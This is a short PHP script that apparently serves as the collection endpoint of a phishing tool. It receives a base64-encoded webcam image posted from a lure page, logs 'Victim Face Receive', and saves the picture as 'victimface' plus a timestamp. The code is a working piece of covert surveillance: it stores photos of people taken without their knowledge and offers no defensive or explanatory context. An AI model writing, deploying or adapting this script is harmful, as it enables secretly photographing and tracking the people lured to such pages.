<?php

$date = date('MdYs');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Victim Face Receive" . "\r\n", 3, "Log.log");

}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( './image/victimface'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

exit();
?>

